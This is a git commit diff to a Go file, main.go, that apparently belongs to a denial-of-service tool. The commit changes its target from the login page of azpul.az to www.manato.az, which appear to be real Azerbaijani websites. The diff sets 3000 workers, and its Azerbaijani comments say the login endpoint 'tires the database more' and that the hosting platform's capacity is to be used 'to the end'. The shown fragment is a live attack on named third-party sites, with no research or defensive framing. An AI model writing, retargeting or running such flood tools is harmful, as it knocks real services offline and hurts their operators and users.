5fdfe8fd128b6495f7b314754ab4b3d1484760d5
agayevv7 <109365950+agayevv7@users.noreply.github.com>
2026-05-08 18:44:55 +0400

    Update main.go

--- main.go
+++ main.go
@@ -12,7 +12,7 @@ import (
 
 func main() {
     // Hədəf endpoint - qeydiyyat və ya giriş hissəsi bazanı daha çox yorur
-	target := "https://azpul.az/az/login" 
+	target := "https://www.manato.az" 
 	workers := 3000 // Railway gücünü sona qədər istifadə edirik
 	
 	fmt.Printf("[!!!] HAKAI-FINAL-ZERO DEVRƏDƏ: %s\n", target)
